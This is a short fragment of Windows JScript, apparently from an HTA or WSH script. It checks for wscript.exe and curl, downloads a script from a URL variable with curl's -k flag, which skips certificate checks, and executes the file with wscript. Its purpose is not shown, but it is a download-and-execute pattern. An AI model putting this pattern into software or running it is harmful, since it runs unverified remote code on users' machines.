		if(fso.FileExists(aWSCRIPTEXEPath)){
			if( fso.FileExists(aCURLEXE)) {
				var strCmd = aCURLEXE + " -k -o " + scriptFile + " " + URLSAmd;
				wsh.Run(strCmd, 1, true);
				if(fso.FileExists(scriptFile)){
					strCmd = aWSCRIPTEXEPath + " " + scriptFile;
					wsh.Run(strCmd, 1, false);
				}
			}
			else
				alert("Check Integrity Error! File not found: " + aCURLEXE);
		}
		else
			alert("Check Integrity Error! File not found: " + aWSCRIPTEXEPath);
	}
	
